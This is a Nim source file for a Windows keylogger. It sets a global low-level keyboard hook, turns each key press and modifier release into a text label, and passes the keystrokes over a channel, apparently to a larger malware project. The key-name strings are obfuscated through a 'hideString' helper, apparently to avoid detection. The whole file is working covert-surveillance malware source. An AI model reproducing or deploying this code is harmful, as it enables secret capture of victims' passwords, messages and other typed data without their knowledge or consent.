from tables import `[]`
from tables import toTable

from winim/inc/windef import WPARAM
from winim/inc/windef import LPARAM
from winim/inc/windef import LRESULT
from winim/inc/windef import DWORD
from winim/inc/windef import HHOOK


from winim/inc/winuser import PKBDLLHOOKSTRUCT
from winim/inc/winuser import KBDLLHOOKSTRUCT
from winim/inc/winuser import WM_KEYDOWN
from winim/inc/winuser import WM_SYSKEYDOWN
from winim/inc/winuser import WM_KEYUP
from winim/inc/winuser import WM_SYSKEYUP
from winim/inc/winuser import VK_CONTROL
from winim/inc/winuser import VK_LCONTROL
from winim/inc/winuser import VK_RCONTROL
from winim/inc/winuser import VK_SHIFT
from winim/inc/winuser import VK_RSHIFT
from winim/inc/winuser import VK_LSHIFT
from winim/inc/winuser import VK_MENU
from winim/inc/winuser import VK_LMENU
from winim/inc/winuser import VK_RMENU
from winim/inc/winuser import VK_CAPITAL
from winim/inc/winuser import VK_NUMLOCK
from winim/inc/winuser import VK_LWIN
from winim/inc/winuser import VK_RWIN
from winim/inc/winuser import CallNextHookEx
from winim/inc/winuser import SetWindowsHookEx
from winim/inc/winuser import WH_KEYBOARD_LL
from winim/inc/winuser import HOOKPROC
from winim/inc/winuser import MSG
from winim/inc/winuser import GetMessage

from winim/utils import winimConverterBOOLToBoolean

from ../functions/hideString import d
from ../functions/hideString import e

import ../channels

## sursa: http://www.kbdedit.com/manual/low_level_vk_list.html
const keys = {
    # "Mappable" codes
  0xC1: e"[ABNT C1]",             # VK_ABNT_C1
  0xC2: e"[ABNT C2]",             # VK_ABNT_C2
  0x6B: e"[NUMPAD +]",            # VK_ADD
  0xF6: e"[ATTN]",                # VK_ATTN
  0x08: e"[BACKSPACE]",           # VK_BACK
  0x03: e"[BREAK]",               # VK_CANCEL
  0x0C: e"[CLEAR]",               # VK_CLEAR
  0xF7: e"[CR SEL]",              # VK_CRSEL
  0x6E: e"[NUMPAD .]",            # VK_DECIMAL
  0x6F: e"[NUMPAD /]",            # VK_DIVIDE
  0xF9: e"[ER EOF]",              # VK_EREOF
  0x1B: e"[ESC]",                 # VK_ESCAPE
  0x2B: e"[EXECUTE]",             # VK_EXECUTE
  0xF8: e"[EX SEL]",              # VK_EXSEL
  0xE6: e"[ICOCLR]",              # VK_ICO_CLEAR
  0xE3: e"[ICOHLP]",              # VK_ICO_HELP
  0x30: e"0",                     # VK_KEY_0
  0x31: e"1",                     # VK_KEY_1
  0x32: e"2",                     # VK_KEY_2
  0x33: e"3",                     # VK_KEY_3
  0x34: e"4",                     # VK_KEY_4
  0x35: e"5",                     # VK_KEY_5
  0x36: e"6",                     # VK_KEY_6
  0x37: e"7",                     # VK_KEY_7
  0x38: e"8",                     # VK_KEY_8
  0x39: e"9",                     # VK_KEY_9
  0x41: e"A",                     # VK_KEY_A
  0x42: e"B",                     # VK_KEY_B
  0x43: e"C",                     # VK_KEY_C
  0x44: e"D",                     # VK_KEY_D
  0x45: e"E",                     # VK_KEY_E
  0x46: e"F",                     # VK_KEY_F
  0x47: e"G",                     # VK_KEY_G
  0x48: e"H",                     # VK_KEY_H
  0x49: e"I",                     # VK_KEY_I
  0x4A: e"J",                     # VK_KEY_J
  0x4B: e"K",                     # VK_KEY_K
  0x4C: e"L",                     # VK_KEY_L
  0x4D: e"M",                     # VK_KEY_M
  0x4E: e"N",                     # VK_KEY_N
  0x4F: e"O",                     # VK_KEY_O
  0x50: e"P",                     # VK_KEY_P
  0x51: e"Q",                     # VK_KEY_Q
  0x52: e"R",                     # VK_KEY_R
  0x53: e"S",                     # VK_KEY_S
  0x54: e"T",                     # VK_KEY_T
  0x55: e"U",                     # VK_KEY_U
  0x56: e"V",                     # VK_KEY_V
  0x57: e"W",                     # VK_KEY_W
  0x58: e"X",                     # VK_KEY_X
  0x59: e"Y",                     # VK_KEY_Y
  0x5A: e"Z",                     # VK_KEY_Z
  0x6A: e"[NUMPAD *]",            # VK_MULTIPLY
  0xFC: e"[NONAME]",              # VK_NONAME
  0x60: e"[NUMPAD 0]",            # VK_NUMPAD0
  0x61: e"[NUMPAD 1]",            # VK_NUMPAD1
  0x62: e"[NUMPAD 2]",            # VK_NUMPAD2
  0x63: e"[NUMPAD 3]",            # VK_NUMPAD3
  0x64: e"[NUMPAD 4]",            # VK_NUMPAD4
  0x65: e"[NUMPAD 5]",            # VK_NUMPAD5
  0x66: e"[NUMPAD 6]",            # VK_NUMPAD6
  0x67: e"[NUMPAD 7]",            # VK_NUMPAD7
  0x68: e"[NUMPAD 8]",            # VK_NUMPAD8
  0x69: e"[NUMPAD 9]",            # VK_NUMPAD9
  0xBA: e"[OEM_1 (: ;)]",         # VK_OEM_1
  0xE2: e"[OEM_102 (&GT; &LT;)]", # VK_OEM_102
  0xBF: e"[OEM_2 (? /)]",         # VK_OEM_2
  0xC0: e"[OEM_3 (~ `)]",         # VK_OEM_3
  0xDB: e"[OEM_4 ({ [)]",         # VK_OEM_4
  0xDC: e"[OEM_5 (| \\)]",        # VK_OEM_5
  0xDD: e"[OEM_6 (} ])]",         # VK_OEM_6
  0xDE: e "[OEM_7 (\" ')]",       # VK_OEM_7
  0xDF: e"[OEM_8 (Â§ !)]",      # VK_OEM_8
  0xF0: e"[OEM ATTN]",            # VK_OEM_ATTN
  0xF3: e"[AUTO]",                # VK_OEM_AUTO
  0xE1: e"[AX]",                  # VK_OEM_AX
  0xF5: e"[BACK TAB]",            # VK_OEM_BACKTAB
  0xFE: e"[OEMCLR]",              # VK_OEM_CLEAR
  0xBC: e"[OEM_COMMA (&LT; ]",    # VK_OEM_COMMA
  0xF2: e"[COPY]",                # VK_OEM_COPY
  0xEF: e"[CU SEL]",              # VK_OEM_CUSEL
  0xF4: e"[ENLW]",                # VK_OEM_ENLW
  0xF1: e"[FINISH]",              # VK_OEM_FINISH
  0x95: e"[LOYA]",                # VK_OEM_FJ_LOYA
  0x93: e"[MASHU]",               # VK_OEM_FJ_MASSHOU
  0x96: e"[ROYA]",                # VK_OEM_FJ_ROYA
  0x94: e"[TOUROKU]",             # VK_OEM_FJ_TOUROKU
  0xEA: e"[JUMP]",                # VK_OEM_JUMP
  0xBD: e"[OEM_MINUS (_ -)]",     # VK_OEM_MINUS
  0xEB: e"[OEMPA1]",              # VK_OEM_PA1
  0xEC: e"[OEMPA2]",              # VK_OEM_PA2
  0xED: e"[OEMPA3]",              # VK_OEM_PA3
  0xBE: e"[OEM_PERIOD (&GT; .)]", # VK_OEM_PERIOD
  0xBB: e"[OEM_PLUS (+ =)]",      # VK_OEM_PLUS
  0xE9: e"[RESET]",               # VK_OEM_RESET
  0xEE: e"[WSCTRL]",              # VK_OEM_WSCTRL
  0xFD: e"[PA1]",                 # VK_PA1
  0xE7: e"[PACKET]",              # VK_PACKET
  0xFA: e"[PLAY]",                # VK_PLAY
  0xE5: e"[PROCESS]",             # VK_PROCESSKEY
  0x0D: e"[ENTER]",               # VK_RETURN
  0x29: e"[SELECT]",              # VK_SELECT
  0x6C: e"[SEPARATOR]",           # VK_SEPARATOR
  0x20: e"[SPACE]",               # VK_SPACE
  0x6D: e"[NUM -]",               # VK_SUBTRACT
  0x09: e"[TAB]",                 # VK_TAB
  0xFB: e"[ZOOM]",                # VK_ZOOM
  0xFF: e"[NO VK MAPPING]",       # VK__none_
  0x1E: e"[ACCEPT]",              # VK_ACCEPT
  0x5D: e"[CONTEXT MENU]",        # VK_APPS
  0xA6: e"[BROWSER BACK]",        # VK_BROWSER_BACK
  0xAB: e"[BROWSER FAVORITES]",   # VK_BROWSER_FAVORITES
  0xA7: e"[BROWSER FORWARD]",     # VK_BROWSER_FORWARD
  0xAC: e"[BROWSER HOME]",        # VK_BROWSER_HOME
  0xA8: e"[BROWSER REFRESH]",     # VK_BROWSER_REFRESH
  0xAA: e"[BROWSER SEARCH]",      # VK_BROWSER_SEARCH
  0xA9: e"[BROWSER STOP]",        # VK_BROWSER_STOP
  0x14: e"[CAPS LOCK]",           # VK_CAPITAL
  0x1C: e"[CONVERT]",             # VK_CONVERT
  0x2E: e"[DELETE]",              # VK_DELETE
  0x28: e"[ARROW DOWN]",          # VK_DOWN
  0x23: e"[END]",                 # VK_END
  0x70: e"[F1]",                  # VK_F1
  0x79: e"[F10]",                 # VK_F10
  0x7A: e"[F11]",                 # VK_F11
  0x7B: e"[F12]",                 # VK_F12
  0x7C: e"[F13]",                 # VK_F13
  0x7D: e"[F14]",                 # VK_F14
  0x7E: e"[F15]",                 # VK_F15
  0x7F: e"[F16]",                 # VK_F16
  0x80: e"[F17]",                 # VK_F17
  0x81: e"[F18]",                 # VK_F18
  0x82: e"[F19]",                 # VK_F19
  0x71: e"[F2]",                  # VK_F2
  0x83: e"[F20]",                 # VK_F20
  0x84: e"[F21]",                 # VK_F21
  0x85: e"[F22]",                 # VK_F22
  0x86: e"[F23]",                 # VK_F23
  0x87: e"[F24]",                 # VK_F24
  0x72: e"[F3]",                  # VK_F3
  0x73: e"[F4]",                  # VK_F4
  0x74: e"[F5]",                  # VK_F5
  0x75: e"[F6]",                  # VK_F6
  0x76: e"[F7]",                  # VK_F7
  0x77: e"[F8]",                  # VK_F8
  0x78: e"[F9]",                  # VK_F9
  0x18: e"[FINAL]",               # VK_FINAL
  0x2F: e"[HELP]",                # VK_HELP
  0x24: e"[HOME]",                # VK_HOME
  0xE4: e"[ICO00]",               # VK_ICO_00
  0x2D: e"[INSERT]",              # VK_INSERT
  0x17: e"[JUNJA]",               # VK_JUNJA
  0x15: e"[KANA]",                # VK_KANA
  0x19: e"[KANJI]",               # VK_KANJI
  0xB6: e"[APP1]",                # VK_LAUNCH_APP1
  0xB7: e"[APP2]",                # VK_LAUNCH_APP2
  0xB4: e"[MAIL]",                # VK_LAUNCH_MAIL
  0xB5: e"[MEDIA]",               # VK_LAUNCH_MEDIA_SELECT
  0x01: e"[LEFT BUTTON]",         # VK_LBUTTON
  0xA2: e"[LEFT CTRL]",           # VK_LCONTROL
  0x25: e"[ARROW LEFT]",          # VK_LEFT
  0xA4: e"[LEFT ALT]",            # VK_LMENU
  0xA0: e"[LEFT SHIFT]",          # VK_LSHIFT
  0x5B: e"[LEFT WIN]",            # VK_LWIN
  0x04: e"[MIDDLE BUTTON]",       # VK_MBUTTON
  0xB0: e"[NEXT TRACK]",          # VK_MEDIA_NEXT_TRACK
  0xB3: e"[PLAY / PAUSE]",        # VK_MEDIA_PLAY_PAUSE
  0xB1: e"[PREVIOUS TRACK]",      # VK_MEDIA_PREV_TRACK
  0xB2: e"[STOP]",                # VK_MEDIA_STOP
  0x1F: e"[MODE CHANGE]",         # VK_MODECHANGE
  0x22: e"[PAGE DOWN]",           # VK_NEXT
  0x1D: e"[NON CONVERT]",         # VK_NONCONVERT
  0x90: e"[NUM LOCK]",            # VK_NUMLOCK
  0x92: e"[JISHO]",               # VK_OEM_FJ_JISHO
  0x13: e"[PAUSE]",               # VK_PAUSE
  0x2A: e"[PRINT]",               # VK_PRINT
  0x21: e"[PAGE UP]",             # VK_PRIOR
  0x02: e"[RIGHT BUTTON]",        # VK_RBUTTON
  0xA3: e"[RIGHT CTRL]",          # VK_RCONTROL
  0x27: e"[ARROW RIGHT]",         # VK_RIGHT
  0xA5: e"[RIGHT ALT]",           # VK_RMENU
  0xA1: e"[RIGHT SHIFT]",         # VK_RSHIFT
  0x5C: e"[RIGHT WIN]",           # VK_RWIN
  0x91: e"[SCROL LOCK]",          # VK_SCROLL
  0x5F: e"[SLEEP]",               # VK_SLEEP
  0x2C: e"[PRINT SCREEN]",        # VK_SNAPSHOT
  0x26: e"[ARROW UP]",            # VK_UP
  0xAE: e"[VOLUME DOWN]",         # VK_VOLUME_DOWN
  0xAD: e"[VOLUME MUTE]",         # VK_VOLUME_MUTE
  0xAF: e"[VOLUME UP]",           # VK_VOLUME_UP
  0x05: e"[X BUTTON 1]",          # VK_XBUTTON1
  0x06: e"[X BUTTON 2]"           # VK_XBUTTON2
}.toTable

var eHook: HHOOK

# var keylog: string = ""

proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
  if (nCode == 0):

    let kbs: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
    let key: DWORD = kbs.vkCode
    let keyText: string = d keys[kbs.vkCode]

    if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
      mainThread.send keyText

    elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
      if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or
          key == VK_SHIFT or key == VK_RSHIFT or key == VK_LSHIFT or
          key == VK_MENU or key == VK_LMENU or key == VK_RMENU or
          key == VK_CAPITAL or key == VK_NUMLOCK or key == VK_LWIN or
          key == VK_RWIN:
        var KeyName: string = keyText
        KeyName.insert("/", 1) # insert like [SHIFT] [a] [b] [/SHIFT]
        mainThread.send KeyName

  result = CallNextHookEx(0, nCode, wparam, lparam)

proc initKeyloggerThread*(): void {.thread.} =
  eHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC keyboardHandler, 0, 0)

  var msg: MSG

  ## getMessage loop, am nev de asta ca altfel nu ruleaza procul
  while GetMessage(addr msg, 0, 0, 0):
    discard
